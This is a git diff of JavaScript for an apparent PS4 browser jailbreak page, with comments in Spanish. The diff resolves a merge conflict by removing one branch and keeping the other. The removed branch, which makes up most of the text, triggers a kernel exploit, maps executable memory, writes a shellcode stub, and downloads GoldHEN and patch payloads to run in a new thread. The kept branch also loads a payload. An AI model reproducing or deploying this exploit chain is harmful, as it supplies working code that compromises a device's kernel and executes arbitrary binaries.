@@ -1791,7 +1791,7 @@ export async function kexploit() {
     }
 }
 
-// --- 1. FUNCIONES DE MEMORIA Y UTILIDADES ---
+
 function malloc(sz) {
     var backing = new Uint8Array(0x10000 + sz);
     nogc.push(backing);
@@ -1807,9 +1807,8 @@ function malloc32(sz) {
     ptr.backing = new Uint32Array(backing.buffer);
     return ptr;
 }
-
 function array_from_address(addr, size) {
-    var og_array = new Uint32Array(0x1000);
+   var og_array = new Uint32Array(0x1000);
     var og_array_i = mem.addrof(og_array).add(0x10);
     mem.write64(og_array_i, addr);
     mem.write32(og_array_i.add(0x8), size);
@@ -1818,7 +1817,6 @@ function array_from_address(addr, size) {
     return og_array;
 }
 
-<<<<<<< HEAD
 function PayloadLoader(Pfile)
 {
     var loader_addr = chain.sysp(
@@ -1874,94 +1872,3 @@ setTimeout(PayloadLoader("goldhen_2.4b18.9.bin"),500);
 msgs.innerHTML = "GoldHEN v2.4b18.9 Loaded ...";
 
 })
-=======
-var LoadedMSG = "";
-
-function allset() {
-    document.getElementById("msgs").innerHTML = LoadedMSG;
-    try {
-        var msgLimpio = LoadedMSG.replace(/ /g, "%20");
-        var logger = new Image();
-        logger.src = "http://127.0.0.1" + msgLimpio;
-    } catch (e) {
-        console.log("Notificación 9090 no disponible");
-    }
-}
-
-function PayloadLoader(Pfile) {
-    document.getElementById("msgs").innerHTML = "Cargando: " + Pfile + "...";
-    var loader_addr = chain.sysp('mmap', new Int(0, 0), 0x1000, 7, 0x41000, -1, 0);
-    var tmpStubArray = array_from_address(loader_addr, 1);
-    tmpStubArray[0] = 0x00C3E7FF;
-
-    var req = new XMLHttpRequest();
-    req.responseType = "arraybuffer";
-    req.open('GET', Pfile, true);
-    
-    req.onerror = function() {
-        alert("ERROR: No se encontró " + Pfile + " en la caché.");
-    };
-
-    req.onreadystatechange = function () {
-        if (req.readyState == 4 && req.status == 200) {
-            var PLD = req.response;
-            var payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x41000, -1, 0);
-            var pl = array_from_address(payload_buffer, PLD.byteLength * 4);
-            var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
-            var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
-            tmp.set(new Uint8Array(req.response), 0);
-            tmp.set(padding, req.response.byteLength);
-            var shellcode = new Uint32Array(tmp.buffer);
-            pl.set(shellcode, 0);
-            var pthread = malloc(0x10);
-            call_nze('pthread_create', pthread, 0, loader_addr, payload_buffer);
-            allset();
-        }
-    };
-    req.send();
-}
-
-// --- 2. FLUJO DE EJECUCIÓN CORREGIDO PARA CACHÉ ---
-// Esperamos 4 segundos antes de tocar el Kernel para limpiar sockets antiguos
-setTimeout(() => {
-    kexploit().then(() => {
-        // PASO A: Parchear AIO
-        LoadedMSG = "AIO Patches Aplicados";
-        PayloadLoader("aio_patches.bin");
-
-        setTimeout(() => {
-            // PASO B: Cargar GoldHEN
-            LoadedMSG = "GoldHEN v2.4b18.9 Cargado";
-            PayloadLoader("goldhen_2.4b18.9.bin");
-            
-            setTimeout(() => {
-                // PASO C: Mostrar el menú de usuario final
-                document.getElementById('buttonsContainer').style.display = 'block';
-                document.getElementById('msgs').innerHTML = "GoldHEN Listo | Menú GamerHack";
-                document.getElementById('msgs').style.color = "#00FF00";
-
-                // ASIGNACIÓN DE BOTONES
-                document.getElementById('btnEnableUpdates').onclick = () => {
-                    LoadedMSG = "Updates Habilitadas";
-                    PayloadLoader("enable-updates.bin");
-                };
-
-                document.getElementById('btnDisableUpdates').onclick = () => {
-                    LoadedMSG = "Updates Deshabilitadas";
-                    PayloadLoader("disable-updates.bin");
-                };
-
-                document.getElementById('btnApplyFan').onclick = () => {
-                    var val = document.getElementById('tempSelect').value;
-                    LoadedMSG = "Ventilador ajustado a " + val + "C";
-                    PayloadLoader("fan-threshold" + val + ".bin");
-                };
-
-            }, 7000); // 7 segundos para que GoldHEN asiente tras inyectarse
-        }, 4500); // 4.5 segundos entre AIO y GoldHEN
-    }).catch((err) => {
-        // Si sale el error de pktopts, avisamos que reabra
-        alert("Fallo crítico (pktopts): " + err + "\nCierra el navegador y reintenta.");
-    });
-}, 4000); // <--- PAUSA VITAL DE 4 SEGUNDOS ANTES DE EMPEZAR EL EXPLOIT
->>>>>>> 496fbb362b0313686117ca01309255bb31829719
